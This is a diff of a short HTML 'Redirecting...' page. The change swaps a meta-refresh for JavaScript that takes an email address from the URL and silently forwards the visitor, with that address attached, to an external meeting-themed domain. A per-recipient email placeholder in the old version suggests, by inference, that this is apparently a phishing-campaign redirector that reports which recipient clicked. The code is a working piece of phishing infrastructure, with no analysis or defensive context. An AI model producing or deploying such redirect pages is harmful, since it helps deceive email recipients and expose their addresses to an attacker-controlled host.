@@ -1,10 +1,16 @@
+
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="refresh" content="0; url=https://e-meetings.srcv-inc0645.de/u?email=[-email-]" />
     <title>Redirecting...</title>
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const email = params.get("email") || "default@example.com";
+      const target = `https://e-meetings.srcv-inc0645.de/u?email=${encodeURIComponent(email)}`;
+      window.location.replace(target);
+    </script>
   </head>
   <body>
-    <p>If you're not redirected, <a href="https://e-meetings.srcv-inc0645.de/u?email=[-email-]">click here</a>.</p>
+    <p>Redirecting... If not, <a href="#">click here</a>.</p>
   </body>
 </html>
